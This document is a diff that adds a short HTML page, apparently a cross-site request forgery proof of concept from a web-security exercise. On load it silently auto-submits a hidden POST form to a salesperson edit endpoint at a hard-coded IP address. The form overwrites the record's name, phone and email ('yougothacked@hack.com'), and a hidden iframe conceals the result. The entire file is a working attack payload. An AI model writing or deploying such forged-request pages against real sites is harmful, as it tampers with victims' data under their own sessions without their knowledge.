@@ -1,0 +1,14 @@
+<html>
+  <head>
+    <title>Hidden Form</title>
+  </head>
+  <body onload="document.edit_salesperson.submit()">
+    <form action="https://35.193.135.101/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Timothy"><br>
+      <input type="text" name="last_name" value="Lee"><br>
+      <input type="text" name="phone" value="123-567-8901"><br>
+      <input type="text" name="email" value="yougothacked@hack.com"><br>
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html
